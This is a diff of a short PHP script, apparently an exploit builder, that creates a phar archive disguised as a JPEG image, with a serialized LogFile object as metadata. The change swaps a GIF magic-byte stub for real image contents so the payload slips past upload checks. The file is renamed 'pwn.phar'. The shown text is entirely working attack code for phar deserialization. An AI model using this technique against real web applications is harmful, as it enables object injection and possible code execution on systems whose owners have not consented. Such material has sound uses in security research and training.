@@ -7,14 +7,16 @@ class LogFile {
     }
 }
 
-$phar = new \Phar("test.phar");
+$imageContents = file_get_contents('image.jpg');
+
+$phar = new \Phar("pwn.phar");
 $phar->startBuffering();
-$phar->setStub("GIF8;<?php __HALT_COMPILER(); ?>");
+$phar->setStub($imageContents . "<?php __HALT_COMPILER(); ?>");
 
 $payload = new LogFile();
 $phar->setMetadata($payload);
 
-$phar->addFromString("test.txt", "test");
+$phar->addFromString("pwn.txt", "pwn");
 $phar->stopBuffering();
 
 ?>
